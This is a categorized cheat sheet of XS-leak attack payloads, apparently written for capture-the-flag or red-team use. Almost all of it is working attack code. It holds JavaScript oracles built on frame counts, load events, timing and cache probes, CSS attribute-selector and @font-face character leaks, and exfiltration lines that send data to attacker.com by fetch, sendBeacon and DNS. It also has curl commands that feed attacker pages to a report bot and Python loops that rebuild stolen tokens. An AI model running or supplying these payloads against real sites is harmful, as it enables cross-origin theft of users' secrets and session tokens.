# Payload dictionary — every XS-leak payload, categorized

The complete payload corpus — each oracle, each carrier, each exfil.

---

## A. The classic client-side payloads — one per oracle

```js
// === frames.length — a count oracle ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
document.body.appendChild(f);

// === onload/onerror — a hit/miss oracle (an <img>) ===
var i=new Image();
i.onload=()=>exfil(g+'=H'); i.onerror=()=>exfil(g+'=M');
i.src='https://t/api/search?q='+encodeURIComponent(g);

// === a <script> variant ===
var s=document.createElement('script');
s.onload=()=>exfil(g+'=H'); s.onerror=()=>exfil(g+'=M');
s.src='https://t/api/search?q='+encodeURIComponent(g);
document.body.appendChild(s);

// === an <iframe> variant ===
var f=document.createElement('iframe');
f.onload=()=>exfil(g+'=H'); f.onerror=()=>exfil(g+'=M');
f.src='https://t/search?q='+encodeURIComponent(g);
document.body.appendChild(f);

// === a <link> variant ===
var l=document.createElement('link');
l.rel='stylesheet';
l.onload=()=>exfil(g+'=H'); l.onerror=()=>exfil(g+'=M');
l.href='https://t/r/'+encodeURIComponent(g);
document.head.appendChild(l);

// === a <video>/<audio>/<object> variant ===
var v=document.createElement('video');
v.onload=()=>exfil(g+'=H'); v.onerror=()=>exfil(g+'=M');
v.src='https://t/r/'+encodeURIComponent(g);
document.body.appendChild(v);

// === a timing oracle ===
var t0=performance.now();
fetch('https://t/api/search?q='+encodeURIComponent(g),{mode:'no-cors'})
 .finally(()=>exfil(g+'='+Math.round(performance.now()-t0)));

// === a cache-probe ===
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+encodeURIComponent(g)+'?cb='+Math.random();

// === a window.open ===
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);

// === a scrollHeight ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
document.body.appendChild(f);

// === a history.length ===
exfil('history='+window.history.length);

// === a resource-timing read ===
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

## B. The CSS-selector payloads — the declarative channel

```css
/* === the prefix oracle === */
body[secret^="a"]{--m_a:url('/leak/a')}
body[secret^="ab"]{--m_ab:url('/leak/ab')}
body[secret^="abc"]{--m_abc:url('/leak/abc')}
/* === the suffix oracle === */
body[secret$="f"]{--m_f:url('/leak/f')}
body[secret$="ef"]{--m_ef:url('/leak/ef')}
/* === the substring oracle === */
body[secret*="a"]{--m_ha:url('/leak/has-a')}
body[secret*="ab"]{--m_hab:url('/leak/has-ab')}
body[secret*="abc"]{--m_habc:url('/leak/has-abc')}
/* === the exact-match oracle === */
body[secret="full-token"]{--m_full:url('/leak/full')}
/* === the consumer — a multi-layer background === */
#trig{
  background-image:
    var(--m_a,none),var(--m_ab,none),var(--m_abc,none),
    var(--m_f,none),var(--m_ef,none),
    var(--m_ha,none),var(--m_hab,none),var(--m_habc,none),
    var(--m_full,none)
}
/* === the control pair === */
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
#trig-ctl{background-image:var(--yes,none),var(--no,none)}
```

## C. The @font-face unicode-range payloads — the char-set channel

```css
/* === one @font-face per alphabet char === */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
@font-face{font-family:x;src:url('/leak/63');unicode-range:U+0063}
/* ... the whole 62-char alphabet (a-z, A-Z, 0-9) */
#secret{font-family:x;display:block !important}
/* === the requested font URLs ARE the character-set === */
```

## D. The server-state payloads — the sealed channel

```bash
# === the LRU-eviction channel ===
# a redis --maxmemory-policy allkeys-lru — flood the store
# === the counter channel ===
# a GET that increments a readable counter — 'the counter is N+1'
# === the one-shot token ===
# a GETDEL — 'did it survive' — one bit, spend it last
# === the rate-limit bucket ===
# a remaining count — the consumed quota
# === the 'last seen' ===
# a timestamp a GET updates — 'the GET ran at T'
# === a write-back ===
curl -X POST "$BASE/api/comment" -d '{"text":"<leaked>"}'
# === a DOM-writeback ===
# document.body.innerHTML='<div style="font-size:80px">'+d+'</div>'
```

## E. The exfil payloads — the read-back channel

```js
// === a listener GET ===
fetch('https://attacker.com/?'+encodeURIComponent(d))
new Image().src='https://attacker.com/?'+encodeURIComponent(d)
navigator.sendBeacon('https://attacker.com/',d)
// === a write-back ===
fetch('https://t/api/comment',{method:'POST',body:JSON.stringify({t:d})})
// === a DOM-writeback ===
document.body.innerHTML='<div style="position:fixed;inset:0;background:#fff;font-size:80px">'+d+'</div>'
// === a DNS exfil ===
new Image().src='https://'+btoa(d)+'.attacker.com/'
// === a postMessage ===
parent.postMessage(d,'*')
```

## F. The delivery payloads — the bot's path

```bash
# === a /report endpoint ===
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
curl -X POST "$BASE/report" --data-urlencode 'url=https://attacker/page'
# === a data: URL ===
curl -X POST "$BASE/report" --data-urlencode \
  'url=data:text/html,<html><script>...</script></html>'
# === a stored page ===
# === a fragment ===
curl -X POST "$BASE/report" -d 'url=https://target/page#' + fragment
```

## G. The reconstruction payloads — the secret-assembly

```python
# === a binary-search boolean oracle ===
charset='abcdefghijklmnopqrstuvwxyz0123456789'
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c): known+=c; break

# === a sorted secret — the char-set direct answer ===
token=''.join(sorted(leaked_chars))

# === an n-gram beam search ===
def beam(ngrams,w=10,L=32):
    beam=[('',0.)]
    for _ in range(L):
        cand=[]
        for s,sc in beam:
            for ng in ngrams:
                if ng[:-1]==s[-len(ng)+1:]:
                    cand.append((s+ng[-1],sc+score(ng)))
        beam=sorted(cand,key=lambda x:-x[1])[:w]
    return beam[0][0]
```

## H. The control-pair payloads — the channel-proof

```css
/* === an always-true control === */
body[secret]{--yes:url('/leak/YES')}
/* === a never-true control === */
body[nosuchattr]{--no:url('/leak/NO')}
#trig-ctl{background-image:var(--yes,none),var(--no,none)}
/* YES hits + NO doesn't → the channel works */
```
